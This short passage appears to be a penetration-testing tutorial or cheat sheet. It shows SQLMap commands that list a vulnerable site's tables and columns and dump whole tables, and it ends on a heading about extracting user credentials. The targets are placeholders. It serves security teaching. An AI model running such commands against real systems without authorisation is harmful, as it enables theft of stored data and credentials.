SQLMap: Data Extraction
Dumping Tables and Columns

Once a SQL injection vulnerability is confirmed, SQLMap can systematically extract data.

1. Enumerate Tables:

List all tables within a specific database.

sqlmap -u "URL?param=1" -D "db_name" --tables

2. Enumerate Columns:

List all columns within a specific table.

sqlmap -u "URL?param=1" -D "db_name" -T "table_name" --columns

3. Dump Table Data:

Retrieve all records from a specific table.

sqlmap -u "URL?param=1" -D "db_name" -T "table_name" --dump
Example Workflow
Extracting User Credentials
